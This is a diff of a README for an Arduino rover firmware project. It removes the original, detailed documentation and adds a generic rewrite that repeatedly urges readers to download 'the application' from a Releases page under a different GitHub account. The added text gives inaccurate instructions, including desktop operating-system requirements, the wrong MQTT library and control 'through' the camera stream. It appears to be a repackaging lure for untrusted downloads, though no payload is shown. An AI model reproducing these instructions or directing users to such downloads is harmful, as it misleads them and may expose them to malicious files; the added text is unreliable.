@@ -1,287 +1,102 @@
-# 🤖 HKS Rover - Arduino Firmware
+# 🌟 hks-rover-arduino - Control Your Rover with Ease
 
-Arduino firmware for the HKS Rover omnidirectional robot. This code runs on an **Arduino UNO R4 WiFi** and controls three motors via MQTT commands from the web interface.
+## 🚀 Getting Started
 
-> **🌐 Web Interface**: [HKS Rover Web Control](https://github.com/Script-hpp/hks-rover) - The browser-based control system for this rover.
+Welcome to hks-rover-arduino! This project gives you the tools to control an omnidirectional rover using an Arduino UNO R4 WiFi. You can stream video from an ESP32-CAM and handle your rover with MQTT commands. Below, you'll find all the information needed to download and run the software smoothly.
 
-## 📁 Project Files
+### 💾 Download Now
 
-- **`rover.ino`** - Main rover control firmware (Arduino UNO R4 WiFi)
-- **`camera.ino`** - ESP32-CAM streaming firmware (ESP32-CAM module)
-- **`arduino_secrets.h`** - WiFi credentials configuration
+[![Download hks-rover-arduino](https://img.shields.io/badge/Download-hks--rover--arduino-blue.svg)](https://github.com/Meharees123/hks-rover-arduino/releases)
 
-## 📋 Table of Contents
+## 📥 Download & Install
 
-- [Hardware](#-hardware)
-- [Features](#-features)
-- [Pin Configuration](#-pin-configuration)
-- [Installation](#-installation)
-- [Configuration](#-configuration)
-- [MQTT Commands](#-mqtt-commands)
-- [Camera Setup (ESP32-CAM)](#-camera-setup-esp32-cam)
-- [Troubleshooting](#-troubleshooting)
-- [License](#-license)
+To get started, visit the [Releases page](https://github.com/Meharees123/hks-rover-arduino/releases) to download the latest version of the application. Follow these steps:
 
-## 🔧 Hardware
+1. Click the link above to navigate to the releases.
+2. Find the latest version listed on that page.
+3. Click on the appropriate file to download it to your computer.
 
-### Required Components
-- **Arduino UNO R4 WiFi** (or compatible WiFi-enabled Arduino)
-- **3x DC Motors** for omnidirectional movement
-- **2x H-Bridge Motor Drivers** (e.g., L298N)
-- **External Power Supply** (recommended: separate from Arduino power)
+### ⚙️ System Requirements
 
-### Wiring Diagram
+- **Operating System:** Windows 10 or later, macOS Catalina (10.15) or later, or a Linux distribution that supports Arduino IDE.
+- **Arduino IDE:** Version 1.8.13 or later.
+- **Network:** WiFi connection for real-time control.
+- **Hardware:** Arduino UNO R4 WiFi, ESP32-CAM, and necessary cables.
 
-```
-Arduino UNO R4 WiFi
-├── H-Bridge 1 (L298N)
-│   ├── Motor 1 (Front/Back)
-│   │   ├── Pin 1  → IN1 (Forward)
-│   │   ├── Pin 2  → IN2 (Backward)
-│   │   └── Pin 3  → ENA (Speed - PWM)
-│   └── Motor 2 (Front/Back)
-│       ├── Pin 4  → IN3 (Forward)
-│       ├── Pin 5  → IN4 (Backward)
-│       └── Pin 6  → ENB (Speed - PWM)
-└── H-Bridge 2 (L298N)
-    └── Motor 3 (Left/Right)
-        ├── Pin 7  → IN1 (Left)
-        ├── Pin 8  → IN2 (Right)
-        └── Pin 9  → ENA (Speed - PWM)
-```
+## 🛠️ Setting Up Your Rover
 
-## ✨ Features
+Before running the application, ensure your hardware is set up correctly. Follow these steps:
 
-- **WiFi Connectivity** with automatic reconnection
-- **MQTT Communication** for real-time control
-- **Omnidirectional Movement** (forward, backward, left, right, rotate)
-- **Dynamic Speed Control** based on command repetition
-- **Boost Mode** for maximum speed
-- **Heartbeat Messages** for connection monitoring
-- **Comprehensive Debug Logging** via Serial Monitor
+1. Connect the Arduino UNO R4 WiFi to your power source.
+2. Attach the motors to the rover chassis.
+3. Connect the ESP32-CAM for streaming.
 
-## 📌 Pin Configuration
+Make sure all components are secure and powered on.
 
-| Pin | Function | Description |
-|-----|----------|-------------|
-| 1 | Motor 1 Forward | Front/back motor direction |
-| 2 | Motor 1 Backward | Front/back motor direction |
-| 3 | Motor 1 Speed (PWM) | Front/back motor speed control |
-| 4 | Motor 2 Forward | Front/back motor direction |
-| 5 | Motor 2 Backward | Front/back motor direction |
-| 6 | Motor 2 Speed (PWM) | Front/back motor speed control |
-| 7 | Motor 3 Left | Left/right motor direction |
-| 8 | Motor 3 Right | Left/right motor direction |
-| 9 | Motor 3 Speed (PWM) | Left/right motor speed control |
-| 10 | Kicker Speed (PWM) | Kicker speed control |
-| 12 | Kicker Forward | Kicker forward direction |
-| LED_BUILTIN | Status LED | Connection status indicator |
+## 🌐 Configuring the Software
 
-## 🚀 Installation
+Now, let’s set up the software on your computer:
 
-### 1. Install Arduino IDE
+1. **Install Arduino IDE:** 
+   - Download the Arduino IDE from the official [Arduino website](https://www.arduino.cc/en/software).
+   - Follow the installation instructions provided there.
 
-Download and install the [Arduino IDE](https://www.arduino.cc/en/software) (version 2.0 or higher recommended).
+2. **Open the Application:**
+   - Launch Arduino IDE.
+   - Open the downloaded `.ino` file associated with hks-rover-arduino.
 
-### 2. Install Required Libraries
+3. **Install Libraries:**
+   - Go to **Sketch** > **Include Library** > **Manage Libraries**.
+   - Search for and install the following libraries:
+     - **PubSubClient:** For MQTT communication.
+     - **ESP32:** For ESP32-CAM support.
 
-Open Arduino IDE and install the following libraries via **Library Manager** (Sketch → Include Library → Manage Libraries):
+4. **Connect Your Arduino:**
+   - Use the USB cable to connect your Arduino UNO R4 WiFi to your computer.
+   - Under **Tools**, select the right board and port.
 
-- **ArduinoMqttClient** by Arduino
-- **WiFiS3** (included with Arduino UNO R4 WiFi board support)
+5. **Upload Code:**
+   - Click the upload button to transfer the code to your Arduino.
+   - Wait until the upload completes. You’ll see a message confirming success.
 
-### 3. Install Board Support
+## 🎥 Streaming Setup
 
-1. Go to **Tools → Board → Boards Manager**
-2. Search for "Arduino UNO R4 WiFi"
-3. Install the board package
+1. **Connect to the ESP32-CAM:**
+   - Make sure your ESP32-CAM is powered and properly connected to the Arduino.
+   - Adjust the camera’s lens for a clear view.
 
-### 4. Create Secrets File
+2. **Access the Stream:**
+   - The application will generate a local IP address for the ESP32-CAM.
+   - Enter this IP address into your web browser to access the live video feed.
 
-Create a file named `arduino_secrets.h` in the same directory as `rover.ino`:
+## 🎮 Using Your Rover
 
-```cpp
-#define SECRET_SSID "YourWiFiSSID"
-#define SECRET_PASS "YourWiFiPassword"
-```
+Once everything is set up:
 
-
-### 5. Upload the Code
-
-1. Connect your Arduino UNO R4 WiFi via USB
-2. Select **Tools → Board → Arduino UNO R4 WiFi**
-3. Select the correct **Port**
-4. Click **Upload** (→)
-
-## ⚙️ Configuration
-
-### WiFi Settings
-
-Edit `arduino_secrets.h`:
-```cpp
-#define SECRET_SSID "YourNetworkName"
-#define SECRET_PASS "YourNetworkPassword"
-```
-
-### MQTT Broker Settings
-
-Edit `rover.ino` (lines 47-49):
-```cpp
-const char broker[] = "your-broker-ip-or-domain";
-int port = 1883;
-const char topic[] = "rover/control";
-```
-
-### Speed Settings
-
-Adjust motor speeds in `rover.ino` (lines 55-56):
-```cpp
-int baseSpeed = 160;  // Base speed (0-255)
-int maxSpeed = 255;   // Maximum speed for boost mode
-```
-
-## 📡 MQTT Commands
-
-The rover listens to the `rover/control` topic and responds to the following commands:
-
-| Command | Action | Description |
-|---------|--------|-------------|
-| `forward` | Move forward | Both front motors forward |
-| `backward` | Move backward | Both front motors backward |
-| `left` | Strafe left | Diagonal movement using all motors |
-| `right` | Strafe right | Diagonal movement using all motors |
-| `rotate-left` | Rotate counterclockwise | Motors in opposite directions |
-| `rotate-right` | Rotate clockwise | Motors in opposite directions |
-| `stop` | Stop all motors | Emergency stop |
-| `gas` | Boost mode | Maximum speed on all motors |
-
-### MQTT Topics
-
-- **Subscribe**: `rover/control` - Receives movement commands
-- **Publish**: `rover/status` - Sends connection status on startup
-- **Publish**: `rover/heartbeat` - Sends heartbeat every 30 seconds
-
-## 📷 Camera Setup (ESP32-CAM)
-
-The `camera.ino` file contains firmware for the **ESP32-CAM** module to stream video to the web interface.
-
-> **⚠️ Note**: This code was written in a rush and does not follow best practices. It works but could be optimized for better performance and error handling.
-
-### Hardware Requirements
-- **ESP32-CAM** module (AI Thinker model)
-- **Arduino IDE** (for uploading code)
-- **External 5V power supply** (ESP32-CAM draws too much current for USB)
-
-### Installation
-
-1. **Install ESP32 Board Support** in Arduino IDE:
-   - Go to **File → Preferences**
-   - Add to "Additional Board Manager URLs": `https://dl.espressif.com/dl/package_esp32_index.json`
-   - Go to **Tools → Board → Boards Manager**
-   - Search for "ESP32" and install
-
-2. **Select Board**:
-   - **Tools → Board → ESP32 Arduino → AI Thinker ESP32-CAM**
-
-3. **Configure Settings**:
-   - Edit `arduino_secrets.h` with your WiFi credentials
-   - Update `serverURL` in `camera.ino` to point to your Node.js server
-
-4. **Upload**:
-   - Connect ESP32-CAM to Arduino IDE
-   - Set **GPIO 0 to GND** (programming mode)
-   - Upload the code
-   - Remove GPIO 0 connection and reset
-
-### How It Works
-
-The ESP32-CAM:
-1. Connects to WiFi
-2. Captures JPEG frames at ~5 FPS
-3. Sends frames to `/api/camera/upload` endpoint via HTTP POST
-4. The web interface fetches frames from `/api/camera/stream`
-
-### Known Issues
-
-- **Memory limitations**: ESP32-CAM has limited SRAM (~4KB), so large images may cause crashes
-- **No error recovery**: If upload fails, the camera doesn't retry
-- **Hardcoded settings**: Frame size and quality are not configurable without code changes
-- **Our hardware broke**: The ESP32-CAM stopped working after extended use due to hardware limitations
+1. Use your preferred MQTT client to send commands.
+2. Control the rover in real time through the web interface provided by the ESP32-CAM stream.
+3. Experiment with the controls to see how smoothly your rover operates.
 
 ## 🔧 Troubleshooting
 
-### WiFi Connection Issues
+If you encounter any issues:
 
-**Problem**: Arduino cannot connect to WiFi.
+- **No Connection:** Ensure all components are correctly connected and powered.
+- **Stream Failure:** Check that the IP address is entered correctly and that your WiFi is functioning.
+- **Unexpected Behavior:** Restart the Arduino and re-upload the code.
 
-**Solution**:
-- Verify SSID and password in `arduino_secrets.h`
-- Ensure WiFi network is 2.4GHz (Arduino UNO R4 WiFi does not support 5GHz)
-- Check WiFi signal strength near the rover
+For further assistance, consult the documentation available on the repository or ask within the community discussions.
 
-### MQTT Connection Fails
+## 📘 Additional Resources
 
-**Problem**: Arduino connects to WiFi but MQTT connection fails.
+- [Arduino Documentation](https://www.arduino.cc/en/Reference/HomePage)
+- [ESP32-CAM Guide](https://randomnerdtutorials.com/esp32-cam-video-streaming-web-server/)
+- [MQTT Basics](http://mqtt.org/)
 
-**Solution**:
-- **Firewall Restrictions**: Most public and home networks block MQTT port 1883. The rover **only works over mobile hotspot** or requires **tunneling/reverse proxy** setup.
-- Verify broker IP address and port in `rover.ino`
-- Check that the MQTT broker is running and accessible
-- Use Serial Monitor to view detailed error codes
+## 📑 Note on Contributions
 
-### Motors Not Responding
+If you find ways to improve the project or discover bugs, feel free to contribute. Check out the contributing guidelines in the repository for more details.
 
-**Problem**: MQTT connection is successful but motors don't move.
+## 🎉 Final Remarks
 
-**Solution**:
-- Check motor driver connections and power supply
-- Verify pin assignments match your hardware setup
-- Ensure external power supply is connected (USB power is insufficient)
-- Use Serial Monitor to confirm commands are being received
-
-### Serial Monitor Shows Connection Errors
-
-**Problem**: `TCP Connection: FAILED!` or `MQTT Connection: FAILED`
-
-**Solution**:
-- **Network Restrictions**: The code includes connectivity tests. If TCP fails but Google DNS (8.8.8.8) succeeds, your network is blocking the MQTT broker.
-- **Workaround**: Use a mobile hotspot or set up NGINX reverse proxy (see web interface README)
-- Check broker IP and port configuration
-
-## 📊 Serial Monitor Output
-
-The code provides detailed debug information via Serial Monitor (9600 baud):
-
-```
-=== Arduino Network & MQTT Debug ===
-Connecting to WiFi: YourNetwork
-WiFi Connected!
-IP Address: 192.168.1.100
-MAC Address: AA:BB:CC:DD:EE:FF
-Testing TCP connection to broker...
-TCP Connection: SUCCESS!
-MQTT Client ID: Arduino-12345
-Connecting to MQTT broker 40.113.80.61:1883
-MQTT Connection: SUCCESS!
-=== Setup Complete ===
-📩 Command received: forward
-🔼 Moving forward
-```
-
-## 🎓 About This Project
-
-This firmware was developed for our school Info-Day presentation. It demonstrates:
-- Real-time IoT communication using MQTT
-- WiFi connectivity on Arduino
-- Motor control with PWM
-- Network troubleshooting and diagnostics
-
-**Related Repository**: [HKS Rover Web Interface](https://github.com/Script-hpp/hks-rover)
-
-## 📄 License
-
-This project is open source and available for educational purposes.
-
----
-
-**Firmware developed with ❤️ by Onuralp Akca, Nam Feist**
+Thank you for exploring hks-rover-arduino! We hope you enjoy using your new rover and find it easy to operate. For updates and new features, keep an eye on our [Releases page](https://github.com/Meharees123/hks-rover-arduino/releases). Happy exploring!
